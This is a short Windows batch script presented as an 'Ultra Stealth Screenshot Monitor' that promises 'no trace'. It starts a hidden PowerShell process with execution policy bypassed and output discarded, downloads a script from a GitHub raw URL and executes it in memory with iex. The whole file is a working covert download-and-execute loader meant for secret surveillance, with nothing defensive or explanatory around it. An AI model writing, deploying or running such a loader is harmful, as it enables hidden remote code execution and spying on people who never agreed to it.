@echo off
setlocal

:: Ultra Stealth Screenshot Monitor
:: No window, no minimize, no trace

set "url=https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/file.ps1"

:: Run completely hidden and detached
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$content = (Invoke-WebRequest ''%url%'' -UseBasicParsing).Content; iex $content\"' -WindowStyle Hidden -NoNewWindow" >nul 2>&1

exit
